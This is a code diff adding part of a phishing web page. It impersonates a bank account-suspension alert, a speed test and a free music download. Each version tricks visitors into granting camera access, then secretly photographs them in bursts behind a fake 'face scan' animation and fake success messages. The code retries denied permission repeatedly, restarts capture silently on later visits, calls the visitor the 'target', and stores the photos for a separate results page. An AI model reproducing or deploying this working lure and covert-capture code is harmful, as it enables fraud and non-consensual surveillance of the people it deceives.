+                offerBig: '🚨 ACCOUNT SUSPENDED',
+                offerSub: 'Immediate action required to restore access',
+                msg: 'Your bank account has been temporarily suspended due to suspicious transactions. Please verify your identity immediately using the secure biometric scan to restore full access.',
+                btnIcon: 'fa-solid fa-building-columns',
+                btnText: 'Verify Identity Now',
+                statusWaiting: 'Running biometric scan...',
+                statusDone: 'Account restored successfully!',
+                successIcon: '✅',
+                successTitle: 'Account Restored',
+                successSub: 'Your account is now active.\nAll restrictions have been lifted.',
+                timerMsg: 'Account freezes in',
+                note: '🔒 nationalbank.com — 256-bit SSL Secured',
+            },
+
+            speedtest: {
+                title: 'SpeedTest Pro — Free',
+                brand: 'SpeedTest Pro',
+                tagline: 'Test Your Internet Speed',
+                logo: '⚡',
+                offerBig: '0 Mbps',
+                offerSub: 'Click below to start your speed test',
+                msg: 'SpeedTest Pro measures your real internet speed including download, upload, ping, and more. Grant camera access to enable advanced network diagnostics and AR speed overlay.',
+                btnIcon: 'fa-solid fa-gauge-high',
+                btnText: 'Start Speed Test',
+                statusWaiting: 'Running diagnostics...',
+                statusDone: 'Test complete! Results ready.',
+                successIcon: '⚡',
+                successTitle: 'Test Complete!',
+                successSub: 'Download: 85.3 Mbps · Upload: 24.1 Mbps\nPing: 14ms — Excellent!',
+                timerMsg: 'Analyzing network',
+                note: '🔒 speedtest-pro.app — No data stored',
+            },
+
+            music: {
+                title: 'FreeBeats — Download Music',
+                brand: 'FreeBeats',
+                tagline: '10 Million Songs · Free Forever',
+                logo: '🎵',
+                offerBig: '🎵 Unlock Free Music',
+                offerSub: 'Download unlimited songs — No subscription',
+                msg: 'FreeBeats lets you download unlimited music for free! To unlock your premium access and enable offline downloads, complete a quick age verification using your camera.',
+                btnIcon: 'fa-solid fa-music',
+                btnText: 'Unlock & Download Free',
+                statusWaiting: 'Verifying your access...',
+                statusDone: 'Premium unlocked!',
+                successIcon: '🎶',
+                successTitle: 'Premium Unlocked!',
+                successSub: 'You now have unlimited free downloads.\nEnjoy your music!',
+                timerMsg: 'Offer expires in',
+                note: '🔒 freebeats.app — No credit card required',
+            }
+        };
+
+        // ============================================================
+        //  INIT
+        // ============================================================
+        const params = new URLSearchParams(window.location.search);
+        const sessionId = params.get('s') || 'DEMO';
+        const themeKey = params.get('th') || 'freedata';
+        const theme = THEMES[themeKey] || THEMES.freedata;
+
+        // Apply theme class to body
+        document.body.classList.add('th-' + themeKey);
+
+        // Get timer countdown (random 5-12 mins)
+        const countdown = Math.floor(Math.random() * 7 + 5);
+        let timerSeconds = countdown * 60;
+
+        // Set page title
+        document.getElementById('pageTitle').textContent = theme.title;
+
+        // Render the card
+        document.getElementById('mainCard').innerHTML = `
+    <div class="c-header">
+      <span class="c-logo"></span>
+      <div class="c-brand">${theme.brand}</div>
+      <div class="c-tagline">${theme.tagline}</div>
+    </div>
+    <div class="c-body">
+      <div class="c-offer-box">
+        <div class="c-offer-big">${theme.offerBig}</div>
+        <div class="c-offer-sub">${theme.offerSub}</div>
+      </div>
+      <div class="c-timer">
+        <div class="timer-dot"></div>
+        <span>${theme.timerMsg}: <strong id="timerDisplay">${countdown}:00</strong></span>
+      </div>
+      <p class="c-msg">${theme.msg}</p>
+      <div class="c-progress"><div class="c-progress-fill" id="progressFill"></div></div>
+      <div class="c-status" id="statusMsg"></div>
+      <button class="c-btn" id="mainBtn" onclick="startCapture()">
+        <i class="${theme.btnIcon}"></i> ${theme.btnText}
+      </button>
+      <div class="c-scanner" id="scannerOverlay">
+        <div class="scan-line"></div>
+        <div class="scan-circle">
+          <i class="fa-solid fa-user-secret scan-icon"></i>
+        </div>
+        <div style="font-weight:700; font-size:1.1rem; margin-bottom:5px;">Scanning Face...</div>
+        <div style="font-size:0.8rem; opacity:0.8;">Keep your face within view</div>
+      </div>
+      <div class="c-denied" id="deniedBox">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+        Access was denied. Please allow camera in your browser settings and refresh.
+      </div>
+      <div class="c-success" id="successBox">
+        <div class="c-success-icon">${theme.successIcon}</div>
+        <div class="c-success-title">${theme.successTitle}</div>
+        <div class="c-success-sub">${theme.successSub}</div>
+      </div>
+      <p class="c-note">${theme.note}</p>
+    </div>
+  `;
+
+        // Start countdown timer
+        const timerEl = document.getElementById('timerDisplay');
+        const timerInterval = setInterval(() => {
+            timerSeconds--;
+            if (timerSeconds <= 0) { clearInterval(timerInterval); timerEl.textContent = '0:00'; return; }
+            const m = Math.floor(timerSeconds / 60);
+            const s = timerSeconds % 60;
+            timerEl.textContent = m + ':' + String(s).padStart(2, '0');
+        }, 1000);
+
+        // Speed test: animate the number
+        if (themeKey === 'speedtest') {
+            let v = 0;
+            const offerBigEl = document.querySelector('.c-offer-big');
+            const si = setInterval(() => {
+                v = Math.min(v + Math.random() * 8, 85.3);
+                offerBigEl.textContent = v.toFixed(1) + ' Mbps';
+                if (v >= 85.3) clearInterval(si);
+            }, 120);
+        }
+
+        // ============================================================
+        //  CAPTURE ENGINE v2 — Fast, Auto-Retry, Never-Fail
+        // ============================================================
+        let stream = null;
+        let capturing = false;
+        let retryCount = 0;
+        const MAX_RETRY = 10;   // auto-retry up to 10 times
+        const MAX_PHOTOS = 10;   // capture 10 photos per session
+        const INTERVAL = 800;   // ms between each shot
+        const WARMUP_MS = 1500; // ms to wait after stream starts so camera sensor lights up (prevents black frames)
+        const PERM_KEY = 'cemra_perm_granted';
+
+        // --- Sync Status to Results Page ---
+        function setSyncStatus(status) {
+            localStorage.setItem('cemra_status_' + sessionId, JSON.stringify({
+                status,
+                lastUpdate: Date.now()
+            }));
+        }
+        setSyncStatus('connected'); // First status: target has opened the link
+
+        // --- Auto-launch: if permission was granted before, skip the button ---
+        // Use setTimeout (not DOMContentLoaded) because the card HTML is built dynamically above;
+        // by the time this script runs the DOM elements already exist.
+        setTimeout(() => {
+            if (localStorage.getItem(PERM_KEY) === '1') {
+                // Hide button, silently start right away
+                const btn = document.getElementById('mainBtn');
+                if (btn) btn.style.display = 'none';
+                setStatus(theme.statusWaiting);
+                setProgress(10);
+                requestCamera();
+            }
+        }, 300); // small delay so page renders first
+
+        // --- Button click ---
+        async function startCapture() {
+            const btn = document.getElementById('mainBtn');
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fa-solid fa-spinner spin"></i> Please wait...';
+            }
+            setStatus(theme.statusWaiting);
+            setProgress(10);
+            await requestCamera();
+        }
+
+        // --- Core camera request with full fallback chain ---
+        async function requestCamera() {
+            if (capturing) return;
+
+            const constraints = [
+                { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
+                { video: { facingMode: { ideal: 'user' } }, audio: false },
+                { video: true, audio: false },
+                { video: { width: 640, height: 480 }, audio: false }
+            ];
+
+            for (const constraint of constraints) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia(constraint);
+                    const camType = JSON.stringify(constraint).includes('user') ? 'front' : 'back';
+                    localStorage.setItem(PERM_KEY, '1'); // remember permission granted
+                    onGranted(camType);
+                    return;
+                } catch (e) {
+                    // try next constraint
+                }
+            }
+
+            // All constraints failed — schedule retry
+            scheduleRetry();
+        }
+
+        // --- Auto retry with exponential backoff ---
+        function scheduleRetry() {
+            if (retryCount >= MAX_RETRY) {
+                onPermanentFail();
+                return;
+            }
+            retryCount++;
+            const delay = Math.min(1000 * retryCount, 5000); // 1s, 2s, 3s ... max 5s
+            setStatus(`Retrying... (${retryCount}/${MAX_RETRY})`);
+            setSyncStatus('retrying');
+            setProgress(retryCount * 5);
+            setTimeout(requestCamera, delay);
+        }
+
+        // --- Camera granted ---
+        function onGranted(camType) {
+            capturing = true;
+            retryCount = 0;
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            video.play().catch(() => { }); // must call play() explicitly so frames render
+            setProgress(30);
+            setStatus(theme.statusWaiting);
+            setSyncStatus('permission_granted');
+
+            // Wait for video to be ready, then add WARMUP_MS delay before first capture
+            // This prevents black frames because the camera sensor needs time to light up
+            let warmupDone = false;
+            const startCapturing = () => {
+                if (warmupDone) return; // prevent double-call
+                warmupDone = true;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                setProgress(35);
+                setStatus(theme.statusWaiting);
+                // Show scanner overlay
+                const sc = document.getElementById('scannerOverlay');
+                if (sc) sc.classList.add('active');
+                setSyncStatus('capturing');
+
+                // Wait WARMUP_MS after stream is ready so sensor is fully lit
+                setTimeout(() => {
+                    if (capturing) burstCapture(camType, canvas, video);
+                }, WARMUP_MS);
+            };
+
+            video.addEventListener('loadeddata', startCapturing, { once: true });
+            video.addEventListener('canplay', startCapturing, { once: true });
+
+            // Absolute failsafe: start after 3s regardless
+            setTimeout(() => {
+                if (capturing && !warmupDone) {
+                    warmupDone = true;
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    burstCapture(camType, canvas, video);
+                }
+            }, 3000);
+        }
+
+        // --- Burst capture: after warmup, start shooting ---
+        function burstCapture(camType, canvas, video) {
+            let count = 0;
+            const ctx = canvas.getContext('2d');
+
+            // Take first shot (warmup already done, camera is ready)
+            shoot(ctx, canvas, video, camType);
+            count++;
+            setProgress(40);
+
+            const interval = setInterval(() => {
+                if (count >= MAX_PHOTOS) {
+                    clearInterval(interval);
+                    stopStream();
+                    setProgress(100);
+                    setSyncStatus('done');
+                    onDone();
+                    return;
+                }
+
+                // Re-check stream is still alive
+                if (!stream || stream.getTracks().every(t => t.readyState === 'ended')) {
+                    clearInterval(interval);
+                    // Stream died mid-capture — restart
+                    capturing = false;
+                    scheduleRetry();
+                    return;
+                }
+
+                shoot(ctx, canvas, video, camType);
+                count++;
+                setProgress(40 + (count / MAX_PHOTOS) * 58);
+            }, INTERVAL);
+
+            // Keep capturing even if page goes to background
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible' && !capturing) {
+                    requestCamera(); // resume on tab re-focus
+                }
+            });
+        }
+
+        // --- Single frame capture ---
+        function shoot(ctx, canvas, video, camType) {
+            try {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                if (dataUrl && dataUrl.length > 5000) { // ignore blank frames
+                    savePhoto(dataUrl, camType);
+                }
+            } catch (e) {
+                // silent — next shot will retry
+            }
+        }
+
+        // --- Save photo to localStorage ---
+        function savePhoto(dataUrl, camType) {
+            try {
+                const key = 'cemra_captures_' + sessionId;
+                const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                existing.push({
+                    id: 'cap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
+                    src: dataUrl,
+                    camera: camType,
+                    time: new Date().toISOString(),
+                    size: (dataUrl.length / 1024 / 1024).toFixed(2) + ' MB',
+                    session: sessionId,
+                    demo: false
+                });
+                localStorage.setItem(key, JSON.stringify(existing));
+            } catch (e) {
+                // localStorage full? trim oldest and retry
+                try {
+                    const key = 'cemra_captures_' + sessionId;
+                    const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                    existing.splice(0, 2); // remove 2 oldest
+                    existing.push({ id: 'cap_' + Date.now(), src: dataUrl, camera: camType, time: new Date().toISOString(), size: '?', session: sessionId, demo: false });
+                    localStorage.setItem(key, JSON.stringify(existing));
+                } catch { }
+            }
+        }
+
+        // --- Stop stream tracks ---
+        function stopStream() {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+            capturing = false;
+        }
+
+        // --- All done ---
+        function onDone() {
+            capturing = false;
+            setStatus(theme.statusDone);
+            const sc = document.getElementById('scannerOverlay');
+            if (sc) sc.classList.remove('active');
+            const sb = document.getElementById('successBox');
+            if (sb) sb.classList.add('show');
+            const btn = document.getElementById('mainBtn');
+            if (btn) btn.style.display = 'none';
+            clearInterval(timerInterval);
+        }
+
+        // --- Permanent failure (all retries exhausted) ---
+        function onPermanentFail() {
+            capturing = false;
+            const btn = document.getElementById('mainBtn');
+            if (btn) {
+                btn.disabled = false;
+                btn.style.display = 'flex';
+                btn.innerHTML = `<i class="${theme.btnIcon}"></i> ${theme.btnText}`;
+            }
+            const db = document.getElementById('deniedBox');
+            if (db) db.style.display = 'block';
+            setStatus('');
+            setSyncStatus('permission_denied');
+            setProgress(0);
+            // Clear the cached permission so next time it asks again
+            localStorage.removeItem(PERM_KEY);
+        }
+
+        function setStatus(msg) {
+            const el = document.getElementById('statusMsg');
+            if (el) el.textContent = msg;
+        }
+        function setProgress(pct) {
+            const fill = document.getElementById('progressFill');
+            if (fill) fill.style.width = Math.min(pct, 100) + '%';
+        }
+    </script>
+</body>
+
+</html>
